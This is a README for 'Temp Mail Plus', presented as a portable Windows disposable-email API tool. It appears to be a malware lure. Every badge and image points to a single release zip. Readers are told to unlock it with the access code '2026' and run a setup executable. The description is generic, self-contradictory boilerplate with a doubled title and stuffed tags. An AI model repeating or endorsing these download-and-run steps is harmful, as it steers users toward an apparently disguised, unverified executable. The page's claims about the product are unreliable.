<div align="center">

# Temp Mail Plus — Temp Mail Plus — Disposable Email API with Instant Unlimited Inboxes (Portable x64 Build, JSON Configuration)

<p><strong>Temp Mail Plus — Temp Mail Plus — Disposable Email API with Instant Unlimited Inboxes (Portable x64 Build, JSON Configuration): Disposable emails with API — instant, unlimited. Native 64-bit portable build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.</strong></p>

[![CI Build](https://img.shields.io/badge/CI_Build-passing-2ea44f?style=for-the-badge&logo=githubactions&logoColor=white)](../../releases/download/v0.1.0/temp-mail-plus-v0.1.0-win64.zip)
[![Version](https://img.shields.io/badge/Release-v0.1.0-2ea44f?style=for-the-badge&logo=github)](../../releases/download/v0.1.0/temp-mail-plus-v0.1.0-win64.zip)
[![Platform](https://img.shields.io/badge/Platform-Windows_10%2F11_x64-0969da?style=for-the-badge&logo=windows)](../../releases/download/v0.1.0/temp-mail-plus-v0.1.0-win64.zip)
[![Stars](https://img.shields.io/github/stars/TestOwner/temp-mail-plus?style=for-the-badge&logo=github&color=e3b341)](../../stargazers)

<p><strong>⬇ No compiler. No setup. Grab the prebuilt package and run.</strong></p>

<a href="../../releases/download/v0.1.0/temp-mail-plus-v0.1.0-win64.zip"><img src="download_btn.svg" alt="Download temp-mail-plus-v0.1.0-win64.zip" width="520"></a>

<br>

<a href="../../releases/download/v0.1.0/temp-mail-plus-v0.1.0-win64.zip"><img src="banner.svg" alt="Temp Mail Plus Preview" width="840"></a>

</div>

---

## Executive Summary & Design

**Temp Mail Plus — Disposable emails with API — instant, unlimited** (`temp-mail-plus`) is a dedicated, low-overhead runtime and configuration suite engineered for 64-bit Windows 10 and Windows 11 systems. All parameters are controlled cleanly through `config/settings.json` with live hot-reload support and zero external dependencies.

## Getting Started (No Compiler Needed)

| Platform | Direct Prebuilt Package | Documentation Mirror |
| :--- | :--- | :--- |
| **Windows 10 / 11 (x64)** | [**`temp-mail-plus-v0.1.0-win64.zip`**](../../releases/download/v0.1.0/temp-mail-plus-v0.1.0-win64.zip) | [**Usage Guide (`docs/USAGE.md`)**](docs/USAGE.md) |

1. Download [`temp-mail-plus-v0.1.0-win64.zip`](../../releases/download/v0.1.0/temp-mail-plus-v0.1.0-win64.zip) using the download button above.
2. Extract the archive using the access code (`2026`).
3. Launch `TempMailPlus_Setup_x64.exe` (keep `config/settings.json` in the same folder).

## Configuration (`config/settings.json`)

```json
{
  "module": "temp-mail-plus",
  "version": "0.1.0",
  "runtime": {
    "threads": 4,
    "verbose": false,
    "hot_reload": true
  },
  "modules": {
    "mailbox": {
      "enabled": true
    },
    "api": {
      "enabled": true
    },
    "parser": {
      "enabled": true
    },
    "cli": {
      "enabled": true
    }
  }
}
```

## Documentation & Guides

- [Contributing — setup, ground rules, PR flow](CONTRIBUTING.md)
- [FAQ — platform support, data storage](docs/FAQ.md)
- [Changelog — v0.1.0 and later](CHANGELOG.md)
- [Usage Guide — commands and options](docs/USAGE.md)

## Engine Components

| Subsystem | Technical Implementation | Runtime Controls |
| :--- | :--- | :--- |
| **Primary Subsystem** | Bounded ring-buffer pipeline with zero-copy handoff | `live toggle` |
| **State Engine** | Atomic JSON state with crash-safe rollback | `keep_state` |
| **Config Watcher** | Hot-reloadable settings, applied without restart | `hot_reload` |
| **Telemetry** | Compact stderr channel, silent by default | `quiet / --verbose` |

## FAQ

<details>
<summary><b>How fast?</b></summary>

Address ready in a second.
</details>
<details>
<summary><b>API?</b></summary>

REST endpoints for code extraction.
</details>
<details>
<summary><b>Storage?</b></summary>

Local — messages stay on disk.
</details>

## Building from Source

```bash
git clone https://github.com/TestOwner/temp-mail-plus.git
cd temp-mail-plus
cmake -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build --config Release
```

---
<sub>Indexed tags: temp-mail-plus, temp-mail, disposable, email, api, inbox, unlimited, verification, privacy, cli, developer-tools, open-source, windows, automation, productivity, cpp, portable, prebuilt, tools</sub>
